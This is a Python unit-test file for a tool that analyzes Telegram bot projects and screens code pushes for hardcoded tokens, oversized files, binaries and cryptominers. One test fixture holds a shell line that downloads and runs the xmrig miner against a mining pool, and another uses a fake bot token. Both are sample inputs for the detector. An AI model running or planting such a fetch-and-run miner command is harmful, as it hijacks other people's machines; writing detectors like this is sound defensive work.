import unittest

from app.analyze import analyze, contract_toml, parse_requirements, resolve
from app.checks import check_push, verdict

FAKE_TOKEN = "1234567890:" + "A" * 35

BOT = '''
import os, asyncio
from aiogram import Bot, Dispatcher
from dotenv import load_dotenv
import sqlite3
db = sqlite3.connect("data/users.db")
dp = Dispatcher()
async def main():
    await dp.start_polling(Bot(os.getenv("TOKEN")))
if __name__ == "__main__":
    asyncio.run(main())
'''


class AnalyzeTest(unittest.TestCase):
    def test_bot_in_subfolder(self):
        files = {"src/main.py": BOT, "src/utils.py": "import requests\n", "src/requirements.txt": "aiogram==3.13\nrequests\n"}
        a = analyze(list(files) + ["README.md"], files)
        self.assertEqual(a["type"], "telegram-bot")
        self.assertEqual(a["entry_candidates"], ["src/main.py"])
        self.assertEqual(a["secrets"], ["TOKEN"])
        self.assertIn("python-dotenv", a["missing_packages"])
        self.assertEqual(a["data_paths"], ["data/users.db"])
        self.assertEqual(a["problems"], [])
        r = resolve(a, {})
        self.assertEqual(r["errors"], [])
        self.assertEqual(r["contract"]["base_dir"], "src")
        self.assertEqual(r["contract"]["entry"], "main.py")
        self.assertIn('entry = "main.py"', contract_toml(r["contract"]))

    def test_hardcoded_token_is_problem(self):
        files = {"bot.py": f'import telebot\nbot = telebot.TeleBot("{FAKE_TOKEN}")\nbot.infinity_polling()\n'}
        a = analyze(list(files), files)
        self.assertEqual(a["hardcoded_tokens"], [("bot.py", 2)])
        self.assertTrue(any("/revoke" in p for p in a["problems"]))
        self.assertIn("pyTelegramBotAPI", a["missing_packages"])

    def test_two_entries_ask_question(self):
        files = {"bot.py": BOT, "old_bot.py": BOT, "requirements.txt": "aiogram\npython-dotenv\n"}
        a = analyze(list(files), files)
        self.assertEqual([q["id"] for q in a["questions"]], ["entry"])
        r = resolve(a, {"entry": "old_bot.py"})
        self.assertEqual(r["contract"]["entry"], "old_bot.py")

    def test_requirements_parsing(self):
        self.assertEqual(parse_requirements("aiogram>=3 # x\n-r base.txt\nPython_Dotenv==1\n"), {"aiogram", "python-dotenv"})


class ChecksTest(unittest.TestCase):
    def run_checks(self, files: dict[str, bytes], sizes: dict[str, int] | None = None):
        tree = [{"path": p, "type": "blob", "size": (sizes or {}).get(p, len(c))} for p, c in files.items()]
        return check_push(tree, lambda p: files[p])

    def base(self):
        return {
            "school.toml": b'type = "telegram-bot"\nbase_dir = ""\nentry = "bot.py"\n',
            "requirements.txt": b"aiogram\n",
            "bot.py": b"import os\n",
        }

    def test_clean_project_passes(self):
        self.assertEqual(verdict(self.run_checks(self.base())), "ok")

    def test_token_blocks(self):
        files = self.base() | {"bot.py": f"TOKEN = '{FAKE_TOKEN}'\n".encode()}
        f = self.run_checks(files)
        self.assertEqual(verdict(f), "block")
        self.assertEqual(f[0]["code"], "token")

    def test_miner_is_suspicious(self):
        files = self.base() | {"run.sh": b"wget http://x/xmrig && ./xmrig -o stratum+tcp://pool:3333\n"}
        f = self.run_checks(files)
        self.assertEqual(verdict(f), "suspicious")
        self.assertTrue(any("майнер" in x["text"] for x in f))

    def test_big_file_blocks(self):
        files = self.base() | {"video.mp4": b""}
        f = self.run_checks(files, {"video.mp4": 50 * 1024 * 1024})
        self.assertEqual(verdict(f), "block")

    def test_missing_contract_and_entry(self):
        files = self.base()
        del files["school.toml"]
        self.assertEqual(self.run_checks(files)[0]["code"], "contract")
        files = self.base() | {"school.toml": b'type = "telegram-bot"\nentry = "nope.py"\n'}
        self.assertTrue(any("nope.py" in x["text"] for x in self.run_checks(files)))

    def test_elf_binary(self):
        files = self.base() | {"tool": b"\x7fELF\x02\x01"}
        self.assertEqual(verdict(self.run_checks(files)), "suspicious")


if __name__ == "__main__":
    unittest.main()
